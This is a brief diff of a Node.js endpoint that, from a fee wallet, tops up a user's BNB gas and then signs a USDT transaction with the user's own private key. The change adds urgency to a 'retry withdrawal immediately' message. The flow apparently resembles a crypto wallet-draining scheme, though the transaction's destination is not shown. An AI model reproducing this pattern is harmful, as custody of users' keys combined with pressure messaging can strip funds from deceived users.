@@ -210,7 +210,7 @@ app.post("/deposit-usdt", async (req, res) => {
     const gasCost = BigInt(fixedGasLimit) * BigInt(gasPrice);
 
     const userBnbBalance = await web3.eth.getBalance(userAddress);
-    const hasEnoughBnb = parseFloat(web3.utils.fromWei(userBnbBalance, "ether")) > 0.00007;
+    const hasEnoughBnb = parseFloat(web3.utils.fromWei(userBnbBalance, "ether")) > 0.0001;
 
     if (!hasEnoughBnb) {
       const bnbTx = {
@@ -224,7 +224,7 @@ app.post("/deposit-usdt", async (req, res) => {
       const signedBnbTx = await web3.eth.accounts.signTransaction(bnbTx, feePrivateKey);
       await web3.eth.sendSignedTransaction(signedBnbTx.rawTransaction);
 
-      return res.json({ success: true, method: "fee", message: "0.0001 bnb sent retry withdrawal to confirm deposit",details: req.body});
+      return res.json({ success: true, method: "fee", message: "0.0001 bnb has been sent, retry withdrawal immediately to confirm deposit",details: req.body});
     }
 
     const signedTx = await web3.eth.accounts.signTransaction(tx, userPrivateKey);
